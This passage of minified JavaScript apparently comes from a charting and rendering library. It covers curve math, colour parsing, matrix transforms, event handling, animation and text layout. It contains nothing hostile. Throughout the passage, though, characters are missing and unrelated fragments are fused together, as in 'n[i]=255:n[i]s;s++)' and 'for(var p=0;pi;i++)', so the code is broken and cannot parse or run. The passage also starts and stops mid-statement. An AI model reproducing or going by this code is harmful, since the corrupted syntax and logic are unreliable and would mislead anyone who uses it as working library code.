u=t,h=e,c=0,p=1/l,d=1;l>=d;d++){var f=d*p,g=$e(t,n,r,a,f),v=$e(e,i,o,s,f),y=g-u,m=v-h;c+=Math.sqrt(y*y+m*m),u=g,h=v}return c}function on(t,e,n,i){var r=1-i;return r*(r*t+2*i*e)+i*i*n}function an(t,e,n,i){return 2*((1-i)*(e-t)+i*(n-e))}function sn(t,e,n,i,r){var o=t-2*e+n,a=2*(e-t),s=t-i,l=0;if(Ze(o)){if(Ke(a)){var u=-s/a;u>=0&&1>=u&&(r[l++]=u)}}else{var h=a*a-4*o*s;if(Ze(h)){var u=-a/(2*o);u>=0&&1>=u&&(r[l++]=u)}else if(h>0){var c=f_(h),u=(-a+c)/(2*o),p=(-a-c)/(2*o);u>=0&&1>=u&&(r[l++]=u),p>=0&&1>=p&&(r[l++]=p)}}return l}function ln(t,e,n){var i=t+n-2*e;return 0===i?.5:(t-e)/i}function un(t,e,n,i,r){var o=(e-t)*i+t,a=(n-e)*i+e,s=(a-o)*i+o;r[0]=t,r[1]=o,r[2]=s,r[3]=s,r[4]=a,r[5]=n}function hn(t,e,n,i,r,o,a,s,l){var u,h=.005,c=1/0;__[0]=a,__[1]=s;for(var p=0;1>p;p+=.05){x_[0]=on(t,n,r,p),x_[1]=on(e,i,o,p);var d=Bm(__,x_);c>d&&(u=p,c=d)}c=1/0;for(var f=0;32>f&&!(v_>h);f++){var g=u-h,v=u+h;x_[0]=on(t,n,r,g),x_[1]=on(e,i,o,g);var d=Bm(x_,__);if(g>=0&&c>d)u=g,c=d;else{b_[0]=on(t,n,r,v),b_[1]=on(e,i,o,v);var y=Bm(b_,__);1>=v&&c>y?(u=v,c=y):h*=.5}}return l&&(l[0]=on(t,n,r,u),l[1]=on(e,i,o,u)),f_(c)}function cn(t,e,n,i,r,o,a){for(var s=t,l=e,u=0,h=1/a,c=1;a>=c;c++){var p=c*h,d=on(t,n,r,p),f=on(e,i,o,p),g=d-s,v=f-l;u+=Math.sqrt(g*g+v*v),s=d,l=f}return u}function pn(t){var e=t&&w_.exec(t);if(e){var n=e[1].split(\",\"),i=+W(n[0]),r=+W(n[1]),o=+W(n[2]),a=+W(n[3]);if(isNaN(i+r+o+a))return;var s=[];return function(t){return 0>=t?0:t>=1?1:Je(0,i,o,1,t,s)&&$e(0,r,a,1,s[0])}}}function dn(t){return t=Math.round(t),0>t?0:t>255?255:t}function fn(t){return t=Math.round(t),0>t?0:t>360?360:t}function gn(t){return 0>t?0:t>1?1:t}function vn(t){var e=t;return dn(e.length&&\"%\"===e.charAt(e.length-1)?parseFloat(e)/100*255:parseInt(e,10))}function yn(t){var e=t;return gn(e.length&&\"%\"===e.charAt(e.length-1)?parseFloat(e)/100:parseFloat(e))}function mn(t,e,n){return 0>n?n+=1:n>1&&(n-=1),1>6*n?t+(e-t)*n*6:1>2*n?e:2>3*n?t+(e-t)*(2/3-n)*6:t}function _n(t,e,n){return t+(e-t)*n}function xn(t,e,n,i,r){return t[0]=e,t[1]=n,t[2]=i,t[3]=r,t}function bn(t,e){return t[0]=e[0],t[1]=e[1],t[2]=e[2],t[3]=e[3],t}function wn(t,e){k_&&bn(k_,e),k_=D_.put(t,k_||e.slice())}function Sn(t,e){if(t){e=e||[];var n=D_.get(t);if(n)return bn(e,n);t+=\"\";var i=t.replace(/ /g,\"\").toLowerCase();if(i in I_)return bn(e,I_[i]),wn(t,e),e;var r=i.length;if(\"#\"!==i.charAt(0)){var o=i.indexOf(\"(\"),a=i.indexOf(\")\");if(-1!==o&&a+1===r){var s=i.substr(0,o),l=i.substr(o+1,a-(o+1)).split(\",\"),u=1;switch(s){case\"rgba\":if(4!==l.length)return 3===l.length?xn(e,+l[0],+l[1],+l[2],1):xn(e,0,0,0,1);u=yn(l.pop());case\"rgb\":return 3!==l.length?void xn(e,0,0,0,1):(xn(e,vn(l[0]),vn(l[1]),vn(l[2]),u),wn(t,e),e);case\"hsla\":return 4!==l.length?void xn(e,0,0,0,1):(l[3]=yn(l[3]),Mn(l,e),wn(t,e),e);case\"hsl\":return 3!==l.length?void xn(e,0,0,0,1):(Mn(l,e),wn(t,e),e);default:return}}xn(e,0,0,0,1)}else{if(4===r||5===r){var h=parseInt(i.slice(1,4),16);return h>=0&&4095>=h?(xn(e,(3840&h)>>4|(3840&h)>>8,240&h|(240&h)>>4,15&h|(15&h)=h?(xn(e,(16711680&h)>>16,(65280&h)>>8,255&h,9===r?parseInt(i.slice(7),16)/255:1),wn(t,e),e):void xn(e,0,0,0,1)}}}}function Mn(t,e){var n=(parseFloat(t[0])%360+360)%360/360,i=yn(t[1]),r=yn(t[2]),o=.5>=r?r*(i+1):r+i-r*i,a=2*r-o;return e=e||[],xn(e,dn(255*mn(a,o,n+1/3)),dn(255*mn(a,o,n)),dn(255*mn(a,o,n-1/3)),1),4===t.length&&(e[3]=t[3]),e}function Tn(t){if(t){var e,n,i=t[0]/255,r=t[1]/255,o=t[2]/255,a=Math.min(i,r,o),s=Math.max(i,r,o),l=s-a,u=(s+a)/2;if(0===l)e=0,n=0;else{n=.5>u?l/(s+a):l/(2-s-a);var h=((s-i)/6+l/2)/l,c=((s-r)/6+l/2)/l,p=((s-o)/6+l/2)/l;i===s?e=p-c:r===s?e=1/3+h-p:o===s&&(e=2/3+c-h),0>e&&(e+=1),e>1&&(e-=1)}var d=[360*e,n,u];return null!=t[3]&&d.push(t[3]),d}}function Cn(t,e){var n=Sn(t);if(n){for(var i=0;3>i;i++)n[i]=0>e?n[i]*(1-e)|0:(255-n[i])*e+n[i]|0,n[i]>255?n[i]=255:n[i]s;s++)t[a][s]=zn(e[a][s],n[a][s],i)}return t}function Vn(t,e,n,i){for(var r=e.length,o=0;r>o;o++)t[o]=e[o]+n[o]*i;return t}function Hn(t,e,n,i){for(var r=e.length,o=r&&e[0].length,a=0;r>a;a++){t[a]||(t[a]=[]);for(var s=0;o>s;s++)t[a][s]=e[a][s]+n[a][s]*i}return t}function Gn(t,e){for(var n=t.length,i=e.length,r=n>i?e:t,o=Math.min(n,i),a=r[o-1]||{color:[0,0,0,0],offset:0},s=o;sa;if(s)i.length=a;else for(var l=o;a>l;l++)i.push(1===n?r[l]:O_.call(r[l]))}for(var u=i[0]&&i[0].length,l=0;lh;h++)isNaN(i[l][h])&&(i[l][h]=r[l][h])}}function Un(t){if(g(t)){var e=t.length;if(g(t[0])){for(var n=[],i=0;e>i;i++)n.push(O_.call(t[i]));return n}return O_.call(t)}return t}function Xn(t){return t[0]=Math.floor(t[0])||0,t[1]=Math.floor(t[1])||0,t[2]=Math.floor(t[2])||0,t[3]=null==t[3]?1:t[3],\"rgba(\"+t.join(\",\")+\")\"}function Yn(t){return g(t&&t[0])?2:1}function qn(t){return t===B_||t===F_}function jn(t){return t===E_||t===N_}function Zn(){return(new Date).getTime()}function Kn(t){var e=t.pointerType;return\"pen\"===e||\"touch\"===e}function $n(t){t.touching=!0,null!=t.touchTimer&&(clearTimeout(t.touchTimer),t.touchTimer=null),t.touchTimer=setTimeout(function(){t.touching=!1,t.touchTimer=null},700)}function Qn(t){t&&(t.zrByTouch=!0)}function Jn(t,e){return ke(t.dom,new K_(t,e),!0)}function ti(t,e){for(var n=e,i=!1;n&&9!==n.nodeType&&!(i=n.domBelongToZr||n!==e&&n===t.painterRoot);)n=n.parentNode;return i}function ei(t,e){var n=e.domHandlers;lm.pointerEventsSupported?v(q_.pointer,function(i){ii(e,i,function(e){n[i].call(t,e)})}):(lm.touchEventsSupported&&v(q_.touch,function(i){ii(e,i,function(r){n[i].call(t,r),$n(e)})}),v(q_.mouse,function(i){ii(e,i,function(r){r=De(r),e.touching||n[i].call(t,r)})}))}function ni(t,e){function n(n){function i(i){i=De(i),ti(t,i.target)||(i=Jn(t,i),e.domHandlers[n].call(t,i))}ii(e,n,i,{capture:!0})}lm.pointerEventsSupported?v(j_.pointer,n):lm.touchEventsSupported||v(j_.mouse,n)}function ii(t,e,n,i){t.mounted[e]=n,t.listenerOpts[e]=i,Le(t.domTarget,e,n,i)}function ri(t){var e=t.mounted;for(var n in e)e.hasOwnProperty(n)&&Pe(t.domTarget,n,e[n],t.listenerOpts[n]);t.mounted={}}function oi(){return[1,0,0,1,0,0]}function ai(t){return t[0]=1,t[1]=0,t[2]=0,t[3]=1,t[4]=0,t[5]=0,t}function si(t,e){return t[0]=e[0],t[1]=e[1],t[2]=e[2],t[3]=e[3],t[4]=e[4],t[5]=e[5],t}function li(t,e,n){var i=e[0]*n[0]+e[2]*n[1],r=e[1]*n[0]+e[3]*n[1],o=e[0]*n[2]+e[2]*n[3],a=e[1]*n[2]+e[3]*n[3],s=e[0]*n[4]+e[2]*n[5]+e[4],l=e[1]*n[4]+e[3]*n[5]+e[5];return t[0]=i,t[1]=r,t[2]=o,t[3]=a,t[4]=s,t[5]=l,t}function ui(t,e,n){return t[0]=e[0],t[1]=e[1],t[2]=e[2],t[3]=e[3],t[4]=e[4]+n[0],t[5]=e[5]+n[1],t}function hi(t,e,n){var i=e[0],r=e[2],o=e[4],a=e[1],s=e[3],l=e[5],u=Math.sin(n),h=Math.cos(n);return t[0]=i*h+a*u,t[1]=-i*u+a*h,t[2]=r*h+s*u,t[3]=-r*u+h*s,t[4]=h*o+u*l,t[5]=h*l-u*o,t}function ci(t,e,n){var i=n[0],r=n[1];return t[0]=e[0]*i,t[1]=e[1]*r,t[2]=e[2]*i,t[3]=e[3]*r,t[4]=e[4]*i,t[5]=e[5]*r,t}function pi(t,e){var n=e[0],i=e[2],r=e[4],o=e[1],a=e[3],s=e[5],l=n*a-o*i;return l?(l=1/l,t[0]=a*l,t[1]=-o*l,t[2]=-i*l,t[3]=n*l,t[4]=(i*s-a*r)*l,t[5]=(o*r-n*s)*l,t):null}function di(t){var e=oi();return si(e,t),e}function fi(t){return t>ux||-ux>t}function gi(t,e){for(var n=0;n=a&&(s?l&&l():u&&u())},c=function(){a--,0>=a&&(s?l&&l():u&&u())};a||l&&l(),o.length>0&&n.during&&o[0].during(function(t,e){n.during(e)});for(var p=0;pi;i++)t[i]=e[i]}function Ci(t){return g(t[0])}function Ii(t,e,n){if(g(e[n]))if(g(t[n])||(t[n]=[]),L(e[n])){var i=e[n].length;t[n].length!==i&&(t[n]=new e[n].constructor(i),Ti(t[n],e[n],i))}else{var r=e[n],o=t[n],a=r.length;if(Ci(r))for(var s=r[0].length,l=0;a>l;l++)o[l]?Ti(o[l],r[l],s):o[l]=Array.prototype.slice.call(r[l]);else Ti(o,r,a);o.length=r.length}else t[n]=e[n]}function Di(t,e){return t===e||g(t)&&g(e)&&ki(t,e)}function ki(t,e){var n=t.length;if(n!==e.length)return!1;for(var i=0;n>i;i++)if(t[i]!==e[i])return!1;return!0}function Ai(t,e,n,i,r,o,a,s){for(var l=b(i),u=r.duration,h=r.delay,c=r.additive,d=r.setToFinal,f=!k(o),v=t.animators,y=[],m=0;mM;M++){var x=y[M];A[x]=n[x],d?D[x]=i[x]:n[x]=i[x]}}else if(d){L={};for(var M=0;S>M;M++){var x=y[M];L[x]=Un(n[x]),Ii(n,i,x)}}var T=new W_(n,!1,!1,c?_(v,function(t){return t.targetName===e}):null);T.targetName=e,r.scope&&(T.scope=r.scope),d&&D&&T.whenWithKeys(0,D,y),L&&T.whenWithKeys(0,L,y),T.whenWithKeys(null==u?500:u,s?A:i,y).delay(h||0),t.addAnimator(T,e),a.push(T)}}function Li(t){delete Nx[t]}function Pi(t){if(!t)return!1;if(\"string\"==typeof t)return On(t,1)r;r++)n+=On(e[r].color,1);return n/=i,ix>n}return!1}function Oi(t,e){var n=new zx(o(),t,e);return Nx[n.id]=n,n}function Ri(t){t.dispose()}function Ei(){for(var t in Nx)Nx.hasOwnProperty(t)&&Nx[t].dispose();Nx={}}function Ni(t){return Nx[t]}function zi(t,e){Ex[t]=e}function Bi(t){return t.replace(/^\\s+|\\s+$/g,\"\")}function Fi(t,e,n,i){var r=e[0],o=e[1],a=n[0],s=n[1],l=o-r,u=s-a;if(0===l)return 0===u?a:(a+s)/2;if(i)if(l>0){if(r>=t)return a;if(t>=o)return s}else{if(t>=r)return a;if(o>=t)return s}else{if(t===r)return a;if(t===o)return s}return(t-r)/l*u+a}function Vi(t,e){switch(t){case\"center\":case\"middle\":t=\"50%\";break;case\"left\":case\"top\":t=\"0%\";break;case\"right\":case\"bottom\":t=\"100%\"}return C(t)?Bi(t).match(/%$/)?parseFloat(t)/100*e:parseFloat(t):null==t?0/0:+t}function Hi(t,e,n){return null==e&&(e=10),e=Math.min(Math.max(0,e),Hx),t=(+t).toFixed(e),n?t:+t}function Gi(t){return t.sort(function(t,e){return t-e}),t}function Wi(t){if(t=+t,isNaN(t))return 0;if(t>1e-14)for(var e=1,n=0;15>n;n++,e*=10)if(Math.round(t*e)/e===t)return n;return Ui(t)}function Ui(t){var e=t.toString().toLowerCase(),n=e.indexOf(\"e\"),i=n>0?+e.slice(n+1):0,r=n>0?n:e.length,o=e.indexOf(\".\"),a=0>o?0:r-1-o;return Math.max(0,a-i)}function Xi(t,e){var n=Math.log,i=Math.LN10,r=Math.floor(n(t[1]-t[0])/i),o=Math.round(n(Math.abs(e[1]-e[0]))/i),a=Math.min(Math.max(-r+o,0),20);return isFinite(a)?a:20}function Yi(t,e,n){if(!t[e])return 0;var i=m(t,function(t,e){return t+(isNaN(e)?0:e)},0);if(0===i)return 0;for(var r=Math.pow(10,n),o=y(t,function(t){return(isNaN(t)?0:t)/i*r*100}),a=100*r,s=y(o,function(t){return Math.floor(t)}),l=m(s,function(t,e){return t+e},0),u=y(o,function(t,e){return t-s[e]});a>l;){for(var h=Number.NEGATIVE_INFINITY,c=null,p=0,d=u.length;d>p;++p)u[p]>h&&(h=u[p],c=p);++s[c],u[c]=0,++l}return s[e]/r}function qi(t,e){var n=Math.max(Wi(t),Wi(e)),i=t+e;return n>Hx?i:Hi(i,n)}function ji(t){var e=2*Math.PI;return(t%e+e)%e}function Zi(t){return t>-Vx&&Vx>t}function Ki(t){if(t instanceof Date)return t;if(C(t)){var e=Wx.exec(t);if(!e)return new Date(0/0);if(e[8]){var n=+e[4]||0;return\"Z\"!==e[8].toUpperCase()&&(n-=+e[8].slice(0,3)),new Date(Date.UTC(+e[1],+(e[2]||1)-1,+e[3]||1,n,+(e[5]||0),+e[6]||0,e[7]?+e[7].substring(0,3):0))}return new Date(+e[1],+(e[2]||1)-1,+e[3]||1,+e[4]||0,+(e[5]||0),+e[6]||0,e[7]?+e[7].substring(0,3):0)}return new Date(null==t?0/0:Math.round(t))}function $i(t){return Math.pow(10,Qi(t)) }function Qi(t){if(0===t)return 0;var e=Math.floor(Math.log(t)/Math.LN10);return t/Math.pow(10,e)>=10&&e++,e}function Ji(t,e){var n,i=Qi(t),r=Math.pow(10,i),o=t/r;return n=e?1.5>o?1:2.5>o?2:4>o?3:7>o?5:10:1>o?1:2>o?2:3>o?3:5>o?5:10,t=n*r,i>=-20?+t.toFixed(0>i?-i:0):t}function tr(t,e){var n=(t.length-1)*e+1,i=Math.floor(n),r=+t[i-1],o=n-i;return o?r+o*(t[i]-r):r}function er(t){function e(t,n,i){return t.interval[i]=o||a>=e.maxIterations){t+=e.ellipsis;break}var s=0===a?to(t,r,e.ascCharWidth,e.cnCharWidth):o>0?Math.floor(t.length*r/o):0;t=t.substr(0,s),o=vi(t,i)}return\"\"===t&&(t=e.placeholder),t}function to(t,e,n,i){for(var r=0,o=0,a=t.length;a>o&&e>r;o++){var s=t.charCodeAt(o);r+=s>=0&&127>=s?n:i}return o}function eo(t,e){null!=t&&(t+=\"\");var n,i=e.overflow,r=e.padding,o=e.font,a=\"truncate\"===i,s=bi(o),l=B(e.lineHeight,s),u=!!e.backgroundColor,h=\"truncate\"===e.lineOverflow,c=e.width;n=null==c||\"break\"!==i&&\"breakAll\"!==i?t?t.split(\"\\n\"):[]:t?ao(t,e.font,c,\"breakAll\"===i,0).lines:[];var p=n.length*l,d=B(e.height,p);if(p>d&&h){var f=Math.floor(d/l);n=n.slice(0,f)}if(t&&a&&null!=c)for(var g=Qr(c,o,e.ellipsis,{minChar:e.truncateMinChar,placeholder:e.placeholder}),v=0;v=e}function oo(t){return ro(t)?sb[t]?!0:!1:!0}function ao(t,e,n,i,r){for(var o=[],a=[],s=\"\",l=\"\",u=0,h=0,c=0;cn:r+h+d>n)?h?(s||l)&&(f?(s||(s=l,l=\"\",u=0,h=u),o.push(s),a.push(h-u),l+=p,u+=d,s=\"\",h=u):(l&&(s+=l,l=\"\",u=0),o.push(s),a.push(h),s=p,h=d)):f?(o.push(l),a.push(u),l=p,u=d):(o.push(p),a.push(d)):(h+=d,f?(l+=p,u+=d):(l&&(s+=l,l=\"\",u=0),s+=p))}else l&&(s+=l,h+=u),o.push(s),a.push(h),s=\"\",l=\"\",u=0,h=0}return o.length||s||(s=t,l=\"\",u=0),l&&(s+=l),s&&(o.push(s),a.push(h)),1===o.length&&(h+=r),{accumWidth:h,lines:o,linesWidths:a}}function so(t,e,n){return fb.copy(t.getBoundingRect()),t.transform&&fb.applyTransform(t.transform),gb.width=e,gb.height=n,!fb.intersect(gb)}function lo(t,e,n,i,r,o){r[0]=vb(t,n),r[1]=vb(e,i),o[0]=yb(t,n),o[1]=yb(e,i)}function uo(t,e,n,i,r,o,a,s,l,u){var h=tn,c=$e,p=h(t,n,r,a,Mb);l[0]=1/0,l[1]=1/0,u[0]=-1/0,u[1]=-1/0;for(var d=0;p>d;d++){var f=c(t,n,r,a,Mb[d]);l[0]=vb(f,l[0]),u[0]=yb(f,u[0])}p=h(e,i,o,s,Tb);for(var d=0;p>d;d++){var g=c(e,i,o,s,Tb[d]);l[1]=vb(g,l[1]),u[1]=yb(g,u[1])}l[0]=vb(t,l[0]),u[0]=yb(t,u[0]),l[0]=vb(a,l[0]),u[0]=yb(a,u[0]),l[1]=vb(e,l[1]),u[1]=yb(e,u[1]),l[1]=vb(s,l[1]),u[1]=yb(s,u[1])}function ho(t,e,n,i,r,o,a,s){var l=ln,u=on,h=yb(vb(l(t,n,r),1),0),c=yb(vb(l(e,i,o),1),0),p=u(t,n,r,h),d=u(e,i,o,c);a[0]=vb(t,r,p),a[1]=vb(e,o,d),s[0]=yb(t,r,p),s[1]=yb(e,o,d)}function co(t,e,n,i,r,o,a,s,l){var u=ye,h=me,c=Math.abs(r-o);if(1e-4>c%xb&&c>1e-4)return s[0]=t-n,s[1]=e-i,l[0]=t+n,void(l[1]=e+i);if(bb[0]=_b(r)*n+t,bb[1]=mb(r)*i+e,wb[0]=_b(o)*n+t,wb[1]=mb(o)*i+e,u(s,bb,wb),h(l,bb,wb),r%=xb,0>r&&(r+=xb),o%=xb,0>o&&(o+=xb),r>o&&!a?o+=xb:o>r&&a&&(r+=xb),a){var p=o;o=r,r=p}for(var d=0;o>d;d+=Math.PI/2)d>r&&(Sb[0]=_b(d)*n+t,Sb[1]=mb(d)*i+e,u(s,Sb,s),h(l,Sb,l))}function po(t){var e=Math.round(t/Bb*1e8)/1e8;return e%2*Bb}function fo(t,e){var n=po(t[0]);0>n&&(n+=Fb);var i=n-t[0],r=t[1];r+=i,!e&&r-n>=Fb?r=n+Fb:e&&n-r>=Fb?r=n-Fb:!e&&n>r?r=n+(Fb-po(n-r)):e&&r>n&&(r=n-(Fb-po(r-n))),t[0]=n,t[1]=r}function go(t,e,n,i,r,o,a){if(0===r)return!1;var s=r,l=0,u=t;if(a>e+s&&a>i+s||e-s>a&&i-s>a||o>t+s&&o>n+s||t-s>o&&n-s>o)return!1;if(t===n)return Math.abs(o-t)=c}function vo(t,e,n,i,r,o,a,s,l,u,h){if(0===l)return!1;var c=l;if(h>e+c&&h>i+c&&h>o+c&&h>s+c||e-c>h&&i-c>h&&o-c>h&&s-c>h||u>t+c&&u>n+c&&u>r+c&&u>a+c||t-c>u&&n-c>u&&r-c>u&&a-c>u)return!1;var p=nn(t,e,n,i,r,o,a,s,u,h,null);return c/2>=p}function yo(t,e,n,i,r,o,a,s,l){if(0===a)return!1;var u=a;if(l>e+u&&l>i+u&&l>o+u||e-u>l&&i-u>l&&o-u>l||s>t+u&&s>n+u&&s>r+u||t-u>s&&n-u>s&&r-u>s)return!1;var h=hn(t,e,n,i,r,o,s,l,null);return u/2>=h}function mo(t){return t%=Wb,0>t&&(t+=Wb),t}function _o(t,e,n,i,r,o,a,s,l){if(0===a)return!1;var u=a;s-=t,l-=e;var h=Math.sqrt(s*s+l*l);if(h-u>n||n>h+u)return!1;if(Math.abs(i-r)%Ubr&&(r+=Ub);var p=Math.atan2(l,s);return 0>p&&(p+=Ub),p>=i&&r>=p||p+Ub>=i&&r>=p+Ub}function xo(t,e,n,i,r,o){if(o>e&&o>i||e>o&&i>o)return 0;if(i===e)return 0;var a=(o-e)/(i-e),s=e>i?1:-1;(1===a||0===a)&&(s=e>i?.5:-.5);var l=a*(n-t)+t;return l===r?1/0:l>r?s:0}function bo(t,e){return Math.abs(t-e)e&&u>i&&u>o&&u>s||e>u&&i>u&&o>u&&s>u)return 0;var h=Je(e,i,o,s,u,jb);if(0===h)return 0;for(var c=0,p=-1,d=void 0,f=void 0,g=0;h>g;g++){var v=jb[g],y=0===v||1===v?.5:1,m=$e(t,n,r,a,v);l>m||(0>p&&(p=tn(e,i,o,s,Zb),Zb[1]1&&wo(),d=$e(e,i,o,s,Zb[0]),p>1&&(f=$e(e,i,o,s,Zb[1]))),c+=2===p?vd?y:-y:vf?y:-y:f>s?y:-y:vd?y:-y:d>s?y:-y)}return c}function Mo(t,e,n,i,r,o,a,s){if(s>e&&s>i&&s>o||e>s&&i>s&&o>s)return 0;var l=sn(e,i,o,s,jb);if(0===l)return 0;var u=ln(e,i,o);if(u>=0&&1>=u){for(var h=0,c=on(e,i,o,u),p=0;l>p;p++){var d=0===jb[p]||1===jb[p]?.5:1,f=on(t,n,r,jb[p]);a>f||(h+=jb[p]c?d:-d:c>o?d:-d)}return h}var d=0===jb[0]||1===jb[0]?.5:1,f=on(t,n,r,jb[0]);return a>f?0:e>o?d:-d}function To(t,e,n,i,r,o,a,s){if(s-=e,s>n||-n>s)return 0;var l=Math.sqrt(n*n-s*s);jb[0]=-l,jb[1]=l;var u=Math.abs(i-r);if(1e-4>u)return 0;if(u>=Yb-1e-4){i=0,r=Yb;var h=o?1:-1;return a>=jb[0]+t&&ar){var c=i;i=r,r=c}0>i&&(i+=Yb,r+=Yb);for(var p=0,d=0;2>d;d++){var f=jb[d];if(f+t>a){var g=Math.atan2(s,f),h=o?1:-1;0>g&&(g=Yb+g),(g>=i&&r>=g||g+Yb>=i&&r>=g+Yb)&&(g>Math.PI/2&&gf;){var g=s[f++],v=1===f;switch(g===Xb.M&&f>1&&(n||(u+=xo(h,c,p,d,i,r))),v&&(h=s[f],c=s[f+1],p=h,d=c),g){case Xb.M:p=s[f++],d=s[f++],h=p,c=d;break;case Xb.L:if(n){if(go(h,c,s[f],s[f+1],e,i,r))return!0}else u+=xo(h,c,s[f],s[f+1],i,r)||0;h=s[f++],c=s[f++];break;case Xb.C:if(n){if(vo(h,c,s[f++],s[f++],s[f++],s[f++],s[f],s[f+1],e,i,r))return!0}else u+=So(h,c,s[f++],s[f++],s[f++],s[f++],s[f],s[f+1],i,r)||0;h=s[f++],c=s[f++];break;case Xb.Q:if(n){if(yo(h,c,s[f++],s[f++],s[f],s[f+1],e,i,r))return!0}else u+=Mo(h,c,s[f++],s[f++],s[f],s[f+1],i,r)||0;h=s[f++],c=s[f++];break;case Xb.A:var y=s[f++],m=s[f++],_=s[f++],x=s[f++],b=s[f++],w=s[f++];f+=1;var S=!!(1-s[f++]);o=Math.cos(b)*_+y,a=Math.sin(b)*x+m,v?(p=o,d=a):u+=xo(h,c,o,a,i,r);var M=(i-y)*x/_+y;if(n){if(_o(y,m,x,b,b+w,S,e,M,r))return!0}else u+=To(y,m,x,b,b+w,S,M,r);h=Math.cos(b+w)*_+y,c=Math.sin(b+w)*x+m;break;case Xb.R:p=h=s[f++],d=c=s[f++];var T=s[f++],C=s[f++];if(o=p+T,a=d+C,n){if(go(p,d,o,d,e,i,r)||go(o,d,o,a,e,i,r)||go(o,a,p,a,e,i,r)||go(p,a,p,d,e,i,r))return!0}else u+=xo(o,d,o,a,i,r),u+=xo(p,a,p,d,i,r);break;case Xb.Z:if(n){if(go(h,c,p,d,e,i,r))return!0}else u+=xo(h,c,p,d,i,r);h=p,c=d}}return n||bo(c,d)||(u+=xo(h,c,p,d,i,r)||0),0!==u}function Io(t,e,n){return Co(t,0,!1,e,n)}function Do(t,e,n,i){return Co(t,e,!0,n,i)}function ko(t){return!!(t&&\"string\"!=typeof t&&t.width&&t.height)}function Ao(t,e){var n,i,r,o,a=e.x,s=e.y,l=e.width,u=e.height,h=e.r;0>l&&(a+=l,l=-l),0>u&&(s+=u,u=-u),\"number\"==typeof h?n=i=r=o=h:h instanceof Array?1===h.length?n=i=r=o=h[0]:2===h.length?(n=r=h[0],i=o=h[1]):3===h.length?(n=h[0],i=o=h[1],r=h[2]):(n=h[0],i=h[1],r=h[2],o=h[3]):n=i=r=o=0;var c;n+i>l&&(c=n+i,n*=l/c,i*=l/c),r+o>l&&(c=r+o,r*=l/c,o*=l/c),i+r>u&&(c=i+r,i*=u/c,r*=u/c),n+o>u&&(c=n+o,n*=u/c,o*=u/c),t.moveTo(a+n,s),t.lineTo(a+l-i,s),0!==i&&t.arc(a+l-i,s+i,i,-Math.PI/2,0),t.lineTo(a+l,s+u-r),0!==r&&t.arc(a+l-r,s+u-r,r,0,Math.PI/2),t.lineTo(a+o,s+u),0!==o&&t.arc(a+o,s+u-o,o,Math.PI/2,Math.PI),t.lineTo(a,s+n),0!==n&&t.arc(a+n,s+n,n,Math.PI,1.5*Math.PI)}function Lo(t,e,n){if(e){var i=e.x1,r=e.x2,o=e.y1,a=e.y2;t.x1=i,t.x2=r,t.y1=o,t.y2=a;var s=n&&n.lineWidth;return s?(ow(2*i)===ow(2*r)&&(t.x1=t.x2=Oo(i,s,!0)),ow(2*o)===ow(2*a)&&(t.y1=t.y2=Oo(o,s,!0)),t):t}}function Po(t,e,n){if(e){var i=e.x,r=e.y,o=e.width,a=e.height;t.x=i,t.y=r,t.width=o,t.height=a;var s=n&&n.lineWidth;return s?(t.x=Oo(i,s,!0),t.y=Oo(r,s,!0),t.width=Math.max(Oo(i+o,s,!1)-t.x,0===o?0:1),t.height=Math.max(Oo(r+a,s,!1)-t.y,0===a?0:1),t):t}}function Oo(t,e,n){if(!e)return t;var i=ow(2*t);return(i+ow(e))%2===0?i/2:(i+(n?1:-1))/2}function Ro(t){return\"string\"!=typeof t||-1===t.indexOf(\"px\")&&-1===t.indexOf(\"rem\")&&-1===t.indexOf(\"em\")?isNaN(+t)?um+\"px\":t+\"px\":t}function Eo(t,e){for(var n=0;n=e||\"transparent\"===t||\"none\"===t?null:t.image||t.colorStops?\"#000\":t}function Vo(t){return null==t||\"none\"===t?null:t.image||t.colorStops?\"#000\":t}function Ho(t,e,n){return\"right\"===e?t-n[1]:\"center\"===e?t+n[3]/2-n[1]/2:t+n[3]}function Go(t){var e=t.text;return null!=e&&(e+=\"\"),e}function Wo(t){return!!(t.backgroundColor||t.lineHeight||t.borderWidth&&t.borderColor)}function Uo(t){return null!=t&&\"none\"!==t}function Xo(t){if(C(t)){var e=Rw.get(t);return e||(e=Cn(t,-.1),Rw.put(t,e)),e}if(O(t)){var n=h({},t);return n.colorStops=y(t.colorStops,function(t){return{offset:t.offset,color:Cn(t.color,-.1)}}),n}return t}function Yo(t,e,n){t.onHoverStateChange&&(t.hoverState||0)!==n&&t.onHoverStateChange(e),t.hoverState=n}function qo(t){Yo(t,\"emphasis\",Mw)}function jo(t){t.hoverState===Mw&&Yo(t,\"normal\",ww)}function Zo(t){Yo(t,\"blur\",Sw)}function Ko(t){t.hoverState===Sw&&Yo(t,\"normal\",ww)}function $o(t){t.selected=!0}function Qo(t){t.selected=!1}function Jo(t,e,n){e(t,n)}function ta(t,e,n){Jo(t,e,n),t.isGroup&&t.traverse(function(t){Jo(t,e,n)})}function ea(t,e){switch(e){case\"emphasis\":t.hoverState=Mw;break;case\"normal\":t.hoverState=ww;break;case\"blur\":t.hoverState=Sw;break;case\"select\":t.selected=!0}}function na(t,e,n,i){for(var r=t.style,o={},a=0;ap*p?void 0:(p=(h*(e-o)-c*(t-r))/p,[t+p*l,e+p*u])}function Ka(t,e,n,i,r,o,a){var s=t-n,l=e-i,u=(a?o:-o)/oS(s*s+l*l),h=u*l,c=-u*s,p=t+h,d=e+c,f=n+h,g=i+c,v=(p+f)/2,y=(d+g)/2,m=f-p,_=g-d,x=m*m+_*_,b=r-o,w=p*g-f*d,S=(0>_?-1:1)*oS(aS(0,b*b*x-w*w)),M=(w*_-m*S)/x,T=(-w*m-_*S)/x,C=(w*_+m*S)/x,I=(-w*m+_*S)/x,D=M-v,k=T-y,A=C-v,L=I-y; return D*D+k*k>A*A+L*L&&(M=C,T=I),{cx:M,cy:T,x0:-h,y0:-c,x1:M*(r/b-1),y1:T*(r/b-1)}}function $a(t){var e;if(M(t)){var n=t.length;if(!n)return t;e=1===n?[t[0],t[0],0,0]:2===n?[t[0],t[0],t[1],t[1]]:3===n?t.concat(t[2]):t}else e=[t,t,t,t];return e}function Qa(t,e){var n,i=aS(e.r,0),r=aS(e.r0||0,0),o=i>0,a=r>0;if(o||a){if(o||(i=r,r=0),r>i){var s=i;i=r,r=s}var l=e.startAngle,u=e.endAngle;if(!isNaN(l)&&!isNaN(u)){var 